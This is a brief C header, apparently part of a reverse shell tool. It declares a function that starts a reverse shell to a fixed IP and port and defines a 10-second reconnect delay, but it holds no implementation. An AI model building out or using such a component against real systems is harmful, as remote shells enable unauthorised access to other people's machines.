#ifndef __REVERSE_SHELL_H
#define __REVERSE_SHELL_H

#define RECONNECT_DELAY 10 /* Seconds between reconnects */

/**
 * @brief Start reverse shell with fixed IP and port.
 *
 * @param ip
 * @param port
 */
void reverse_shell_start(const char *ip, int port);

#endif /* __REVERSE_SHELL_H */
